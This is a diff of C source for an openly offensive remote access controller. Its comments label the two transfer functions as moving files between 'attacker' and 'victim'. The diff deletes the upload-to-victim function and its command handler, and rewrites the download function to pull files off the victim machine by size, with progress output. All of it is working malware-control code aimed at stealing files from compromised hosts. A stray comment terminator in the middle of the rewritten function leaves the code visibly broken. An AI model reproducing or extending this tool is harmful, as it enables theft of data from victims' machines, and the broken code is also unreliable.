@@ -105,141 +105,75 @@ static int wait_for_command_or_disconnect(int client_fd)
     }
 }
 
-/* Upload file from attacker to victim */
-static int upload_file(int client_fd, const char *local_path, const char *remote_filename)
-{
-    FILE *fp;
-    char cmd[512];
-    char buf[4096];
-    size_t bytes_read;
-    long file_size = 0;
-    char *file_data;
-    
-    /* Open file to get size */
-    fp = fopen(local_path, "rb");
-    if (!fp) {
-        perror("fopen");
-        printf("[-] Cannot open file: %s\n", local_path);
-        return -1;
-    }
-    
-    /* Get file size */
-    fseek(fp, 0, SEEK_END);
-    file_size = ftell(fp);
-    fseek(fp, 0, SEEK_SET);
-    
-    if (file_size <= 0) {
-        printf("[-] File is empty or cannot determine size\n");
-        fclose(fp);
-        return -1;
-    }
-    
-    /* Allocate buffer and read entire file */
-    file_data = malloc(file_size);
-    if (!file_data) {
-        perror("malloc");
-        fclose(fp);
-        return -1;
-    }
-    
-    bytes_read = fread(file_data, 1, file_size, fp);
-    fclose(fp);
-    
-    if (bytes_read != file_size) {
-        printf("[-] Failed to read entire file\n");
-        free(file_data);
-        return -1;
-    }
-    
-    /* Send UPLOAD command with filename and size */
-    snprintf(cmd, sizeof(cmd), "UPLOAD %s %ld\n", remote_filename, file_size);
-    if (write_all(client_fd, cmd, strlen(cmd)) < 0) {
-        perror("write UPLOAD command");
-        free(file_data);
-        return -1;
-    }
-    
-    /* Send file content */
-    if (write_all(client_fd, file_data, file_size) < 0) {
-        perror("write file data");
-        free(file_data);
-        return -1;
-    }
-    
-    /* Send newline to signal end */
-    if (write_all(client_fd, "\n", 1) < 0) {
-        perror("write newline");
-        free(file_data);
-        return -1;
-    }
-    
-    free(file_data);
-    printf("[+] File uploaded successfully (%ld bytes)\n", file_size);
-    return 0;
-}
 
-/* Download file from victim to attacker */
 static int download_file(int client_fd, const char *remote_path, const char *local_path)
 {
     FILE *fp;
     char cmd[512];
+    char size_line[256];
     char buf[4096];
     ssize_t n;
-    size_t file_size = 0;
+    size_t bytes_to_read = 0;
+    size_t bytes_read = 0;
     
-    /* Send DOWNLOAD command */
+   
     snprintf(cmd, sizeof(cmd), "DOWNLOAD %s\n", remote_path);
     if (write_all(client_fd, cmd, strlen(cmd)) < 0) {
         perror("write DOWNLOAD command");
         return -1;
     }
     
-    /* Open local file for writing */
+    
+    if (read_line(client_fd, size_line, sizeof(size_line)) < 0) {
+        printf("[!] Failed to read SIZE response\n");
+        return -1;
+    }
+    
+    if (sscanf(size_line, "SIZE %zu", &bytes_to_read) != 1) {
+        printf("[!] Invalid SIZE response: %s\n", size_line);
+        return -1;
+    }
+    
+    printf("[*] File size: %zu bytes\n", bytes_to_read);
+    
+    
     fp = fopen(local_path, "wb");
     if (!fp) {
         perror("fopen");
         return -1;
     }
     
-    /* Read file data until marker */
-    char tail[64] = { 0 };
-    char combined[BUF_SIZE + sizeof(tail)];
-    const char *marker = "--- End of Output ---\n\n";
-    
-    while (1) {
-        memset(buf, 0, sizeof(buf));
-        n = read(client_fd, buf, sizeof(buf) - 1);
+    */
+    bytes_read = 0;
+    while (bytes_read < bytes_to_read) {
+        size_t to_read = bytes_to_read - bytes_read;
+        if (to_read > sizeof(buf))
+            to_read = sizeof(buf);
+        
+        n = read(client_fd, buf, to_read);
         if (n <= 0) {
             printf("\n[!] Connection lost\n");
             fclose(fp);
             return -1;
         }
         
-        /* Check for end marker */
-        snprintf(combined, sizeof(combined), "%s%s", tail, buf);
-        char *pos = strstr(combined, marker);
-        if (pos) {
-            size_t bytes_before_marker = pos - combined;
-            if (bytes_before_marker > strlen(tail)) {
-                fwrite(combined + strlen(tail), 1, bytes_before_marker - strlen(tail), fp);
-                file_size += bytes_before_marker - strlen(tail);
-            }
-            break;
-        }
-        
-        /* Write data before tail */
-        if (strlen(tail) > 0) {
-            fwrite(tail, 1, strlen(tail), fp);
-            file_size += strlen(tail);
-        }
-        
-        /* Keep last 64 bytes as tail */
-        strncpy(tail, combined + strlen(combined) - 63, 63);
-        tail[63] = '\0';
+        fwrite(buf, 1, n, fp);
+        bytes_read += n;
+        printf("\r[*] Downloaded %zu/%zu bytes", bytes_read, bytes_to_read);
+        fflush(stdout);
+    }
+    printf("\n");
+    
+    
+    char marker_buf[256];
+    if (read_line(client_fd, marker_buf, sizeof(marker_buf)) < 0) {
+        printf("[!] Failed to read end marker\n");
+        fclose(fp);
+        return -1;
     }
     
     fclose(fp);
-    printf("[+] File downloaded successfully (%zu bytes)\n", file_size);
+    printf("[+] File downloaded successfully (%zu bytes) -> %s\n", bytes_read, local_path);
     return 0;
 }
 
@@ -396,16 +330,6 @@ int main(int argc, char **argv)
         break;
     }
 
-    /* NEW: Handle UPLOAD command */
-    if (strncmp(buf, "UPLOAD ", 7) == 0) {
-        char local_path[256], remote_filename[256];
-        if (sscanf(buf, "UPLOAD %255s %255s", local_path, remote_filename) == 2) {
-            upload_file(client_fd, local_path, remote_filename);
-        } else {
-            printf("Usage: UPLOAD <local_path> <remote_filename>\n");
-        }
-        continue;
-    }
 
     /* NEW: Handle DOWNLOAD command */
     if (strncmp(buf, "DOWNLOAD ", 9) == 0) {
